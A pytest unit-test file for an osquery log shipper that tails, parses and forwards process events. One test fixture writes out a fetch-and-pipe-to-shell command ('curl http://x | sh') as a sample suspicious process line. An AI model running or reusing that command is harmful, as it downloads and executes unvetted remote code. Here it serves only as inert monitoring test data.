"""Unit tests for the ingestion shipper and its lifespan gate.

Covers:
- FileShipper tails a log file and ships parsed osquery events to the writer
  (rotation/offset behaviour is exercised in db-writer tests; here we prove
  the end-to-end tail → parse → write loop).
- maybe_create_shipper returns None when disabled and a shipper when enabled
  (without needing a Postgres pool).
"""
from __future__ import annotations

import asyncio
import json

import pytest

from src.ingestion import runner, shipper
from src.ingestion.runner import maybe_create_shipper
from src.ingestion.shipper import FileShipper


def _process_line(name: str = "python3", cmdline: str = "python3 -m pytest") -> str:
    return json.dumps(
        {
            "name": "processes",
            "hostIdentifier": "test-mac.local",
            "calendarTime": "Mon Mar 21 12:00:00 2026 UTC",
            "unixTime": 1774267200,
            "columns": {
                "pid": "1234",
                "name": name,
                "path": f"/opt/homebrew/bin/{name}",
                "cmdline": cmdline,
                "uid": "501",
            },
            "action": "added",
        }
    )


class FakeWriter:
    """Minimal stand-in for LogWriter — records events, never touches a DB."""

    def __init__(self) -> None:
        self.events: list = []

    async def write(self, event) -> None:  # noqa: D401 - mirrors LogWriter.write
        self.events.append(event)


@pytest.mark.asyncio
async def test_shipper_tails_and_ships(tmp_path, monkeypatch):
    log_file = tmp_path / "osqueryd.results.log"
    log_file.write_text(_process_line("python3") + "\n")

    # Redirect the checkpoint away from ~ so the test is hermetic.
    monkeypatch.setattr(shipper, "CHECKPOINT_FILE", tmp_path / "ckpt")

    writer = FakeWriter()
    ship = FileShipper(str(log_file), writer)  # type: ignore[arg-type]
    task = asyncio.create_task(ship.run())

    # First poll (≤1s interval) reads the line already in the file.
    await asyncio.sleep(1.2)
    assert len(writer.events) == 1
    assert writer.events[0].process_name == "python3"

    # Append a second line — the shipper must pick it up on the next poll.
    with open(log_file, "a") as f:
        f.write(_process_line("bash", "bash -c 'curl http://x | sh'") + "\n")
    await asyncio.sleep(1.2)
    assert len(writer.events) == 2
    assert writer.events[1].process_name == "bash"

    ship.stop()
    task.cancel()
    try:
        await asyncio.wait_for(task, timeout=2)
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass


@pytest.mark.asyncio
async def test_shipper_skips_malformed_lines(tmp_path, monkeypatch):
    log_file = tmp_path / "osqueryd.results.log"
    log_file.write_text("not json {{{\n" + _process_line("python3") + "\n")
    monkeypatch.setattr(shipper, "CHECKPOINT_FILE", tmp_path / "ckpt")

    writer = FakeWriter()
    ship = FileShipper(str(log_file), writer)  # type: ignore[arg-type]
    task = asyncio.create_task(ship.run())
    await asyncio.sleep(1.2)

    # Malformed line is logged-and-skipped; the valid line still ships.
    assert len(writer.events) == 1
    assert writer.events[0].process_name == "python3"

    ship.stop()
    task.cancel()
    try:
        await asyncio.wait_for(task, timeout=2)
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass


def test_maybe_create_shipper_disabled_by_default(monkeypatch):
    monkeypatch.setattr(runner.settings, "enable_ingestion_shipper", False)
    assert maybe_create_shipper(FakeWriter()) is None  # type: ignore[arg-type]


def test_maybe_create_shipper_enabled(monkeypatch, tmp_path):
    monkeypatch.setattr(runner.settings, "enable_ingestion_shipper", True)
    monkeypatch.setattr(runner.settings, "osquery_log_path", str(tmp_path / "x.log"))
    ship = maybe_create_shipper(FakeWriter())  # type: ignore[arg-type]
    assert ship is not None
    assert isinstance(ship, FileShipper)
